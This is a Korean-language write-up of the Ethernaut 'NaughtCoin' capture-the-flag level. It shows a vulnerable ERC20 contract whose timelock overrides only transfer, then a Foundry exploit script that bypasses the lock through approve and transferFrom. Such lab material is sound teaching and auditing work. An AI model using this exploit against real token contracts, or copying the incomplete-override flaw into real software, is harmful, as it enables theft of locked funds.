# 지문
NaughtCoin은 ERC20 토큰이며, 당신은 이미 전량을 보유하고 있습니다. 문제는 10년의 잠금(lockout) 기간이 지나야만 전송할 수 있다는 점입니다. 자유롭게 전송할 수 있도록 토큰을 다른 주소로 빼내는 방법을 찾을 수 있을까요? 토큰 잔액을 0으로 만들어 이 레벨을 완료하세요.

도움이 될 만한 것들:

ERC20 스펙

OpenZeppelin 코드베이스

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

# 풀이 

문제의 코드를 보면 ERC20의 `transfer`을 override해서 timelock을 걸어두었음.
근데 토큰을 전송하는 메소드는 `transfer`만 있는건 아님. `transferFrom`도 있음.
가끔 audit하다보면 이런 어처구니 없는 실수가 보이기도함

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function player() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("player address : %s", ITarget(target).player());
        ITarget(target).approve(ITarget(target).player(), type(uint256).max);
        ITarget(target).transferFrom(ITarget(target).player(), address(1), ITarget(target).balanceOf(ITarget(target).player()));
        vm.stopBroadcast();
    }
}
```